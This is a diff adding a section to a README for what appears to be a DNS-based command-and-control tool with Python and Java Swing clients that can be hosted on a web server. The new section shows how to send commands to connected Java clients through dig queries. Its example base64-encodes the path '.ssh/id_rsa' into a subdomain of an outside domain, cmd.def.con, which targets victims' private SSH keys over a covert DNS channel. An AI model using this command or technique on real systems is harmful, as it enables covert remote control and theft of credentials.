@@ -33,3 +33,9 @@ Unlike the python client, in which the user uploads files intentionally, the jav
 
 Naturally, being that this is a java swing client, this could easily be uploaded to a web server.
 
+
+## Sending commands to the Java client:
+Commands are sent from the 'cmd' file. Send your command to all connected java clients using... dig. Of course.
+```bash
+dig $(echo ".ssh/id_rsa" | base64).cmd.def.con
+```
